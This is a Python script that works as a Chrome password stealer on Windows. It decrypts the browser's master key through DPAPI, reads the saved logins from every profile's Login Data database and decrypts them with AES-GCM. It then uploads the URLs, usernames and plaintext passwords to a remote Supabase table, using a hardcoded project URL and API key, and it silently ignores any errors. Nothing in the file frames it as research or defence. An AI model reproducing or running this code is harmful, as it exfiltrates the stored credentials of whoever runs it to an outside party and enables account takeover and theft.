import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
from supabase import create_client, Client

# Paths for Chrome files
user_data_path = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data")
local_state_path = os.path.join(user_data_path, "Local State")

url = "https://jdonjehkvefuurgecthg.supabase.co"  # Replace with your Supabase project URL
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Impkb25qZWhrdmVmdXVyZ2VjdGhnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDIzNzI4MjgsImV4cCI6MjA1Nzk0ODgyOH0.ytS0iwDLGtaxSFLqOwl29xU9JOuU2CnuRxkeAPlXTK8"
supabase: Client = create_client(url, key)

def get_encryption_key():
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_password(password, key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            nonce, ciphertext, tag = password[3:15], password[15:-16], password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        return win32crypt.CryptUnprotectData(password)[1].decode('utf-8')
    except Exception:
        return password.hex()

def extract_passwords():
    if not os.path.exists(user_data_path):
        return

    key = get_encryption_key()
    if not key:
        return

    profile_dirs = [d for d in os.listdir(user_data_path) if d.startswith("Profile") or d == "Default"]
    login_data_list = []

    for profile in profile_dirs:
        chrome_path = os.path.join(user_data_path, profile, "Login Data")
        if not os.path.exists(chrome_path):
            continue

        try:
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            login_data = cursor.fetchall()
        except sqlite3.Error:
            continue
        finally:
            conn.close()

        for row in login_data:
            login_data_list.append({
                "url": row[0],
                "username": row[1],
                "password": decrypt_password(row[2], key)
            })

    if login_data_list:
        try:
            supabase.table("password").insert(login_data_list).execute()
        except Exception:
            pass

if __name__ == "__main__":
    extract_passwords()
